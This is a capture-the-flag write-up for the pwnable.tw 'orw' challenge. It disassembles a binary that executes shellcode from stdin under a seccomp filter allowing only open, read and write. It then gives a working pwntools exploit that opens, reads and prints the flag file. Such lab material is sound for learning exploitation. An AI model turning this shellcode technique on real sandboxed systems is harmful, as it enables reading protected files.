# orw

only open, read, write syscalls are allowed to use

file:

```
orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
```

checksec:

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   74 Symbols     Yes      0               2       orw
```


## solution

The program prompts for some input in stdin and then segfaults, since it wants shellcode.

Lets open it up in r2.

```
[0x080483d0]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze all functions arguments/locals
[0x080483d0]> afl
0x080483d0    1 33           entry0
0x080483a0    1 6            sym.imp.__libc_start_main
0x08048410    4 43           sym.deregister_tm_clones
0x08048440    4 53           sym.register_tm_clones
0x08048480    3 30           sym.__do_global_dtors_aux
0x080484a0    4 43   -> 40   entry.init0
0x08048600    1 2            sym.__libc_csu_fini
0x08048400    1 4            sym.__x86.get_pc_thunk.bx
0x08048604    1 20           sym._fini
0x080484cb    3 125          sym.orw_seccomp
0x080483b0    1 6            sym.imp.prctl
0x08048390    1 6            sym.imp.__stack_chk_fail
0x080485a0    4 93           sym.__libc_csu_init
0x08048548    1 81           main
0x08048380    1 6            sym.imp.printf
0x08048370    1 6            sym.imp.read
0x08048330    3 35           sym._init
0x080483c0    1 6            sym..plt.got
[0x080483d0]> pdf @ main
            ; DATA XREF from entry0 @ 0x80483e7(w)
┌ 81: int main (char **argv);
│           ; var int32_t var_4h @ ebp-0x4
│           ; arg char **argv @ esp+0x24
│           0x08048548      8d4c2404       lea ecx, [argv]
│           0x0804854c      83e4f0         and esp, 0xfffffff0
│           0x0804854f      ff71fc         push dword [ecx - 4]
│           0x08048552      55             push ebp
│           0x08048553      89e5           mov ebp, esp
│           0x08048555      51             push ecx
│           0x08048556      83ec04         sub esp, 4
│           0x08048559      e86dffffff     call sym.orw_seccomp
│           0x0804855e      83ec0c         sub esp, 0xc
│           0x08048561      68a0860408     push str.Give_my_your_shellcode: ; 0x80486a0 ; "Give my your shellcode:"
│           0x08048566      e815feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x0804856b      83c410         add esp, 0x10
│           0x0804856e      83ec04         sub esp, 4
│           0x08048571      68c8000000     push 0xc8                   ; 200
│           0x08048576      6860a00408     push obj.shellcode          ; 0x804a060
│           0x0804857b      6a00           push 0
│           0x0804857d      e8eefdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x08048582      83c410         add esp, 0x10
│           0x08048585      b860a00408     mov eax, obj.shellcode      ; 0x804a060
│           0x0804858a      ffd0           call eax
│           0x0804858c      b800000000     mov eax, 0
│           0x08048591      8b4dfc         mov ecx, dword [var_4h]
│           0x08048594      c9             leave
│           0x08048595      8d61fc         lea esp, [ecx - 4]
└           0x08048598      c3             ret
[0x080483d0]> pdd @ main
/* r2dec pseudo code output */
/* orw @ 0x8048548 */
#include <stdint.h>
 
int32_t main (char ** argv) {
    int32_t var_4h;
    ecx = &argv;
    orw_seccomp (ecx, ebp);
    printf ("Give my your shellcode:");
    read (0, obj.shellcode, 0xc8);
    eax = shellcode;
    void (*eax)() ();
    eax = 0;
    ecx = var_4h;
    esp = ecx - 4;
    return eax;
}

```


Its reading from stdin into a buffer of size 0xc8 and then it executes it. The goal is to construct shellcode to bypass the ORW seccomp.

We can use strace to figure out the orw_seccomp function, since we know its called just before the printf.
it calls `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len=12, filter=0xffe4899c})`. 

[SECCOMP](https://en.wikipedia.org/wiki/Seccomp) means that we can only use `open`, `read,` and `write`. Our goal is to `cat /home/orw/flag`. The shellcode can be constructed easily:


```cpp
char[0x30] buffer;
fd = open("/home/orw/flag", RD_ONLY);
read(fd, buffer, 0x30);
write(stdout, buffer, 0x30);
```

We can just shellcraft for this rather than translating it all to assembly.

```py
#!/usr/bin/env python3

from pwn import *

def start():
    global p
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10001)
    else:
        p = elf.process()

context(os="linux", arch="i386")
context.binary = elf = ELF("./orw")
start()

shellcode = shellcraft.i386.linux.open("/home/orw/flag\x00")
shellcode += shellcraft.i386.linux.read("eax", "esp", 0x30)
shellcode += shellcraft.i386.linux.write(1, "esp", 0x30)

p.recvuntil(b"Give my your shellcode:")
p.send(asm(shellcode))
print(p.recvall())
```
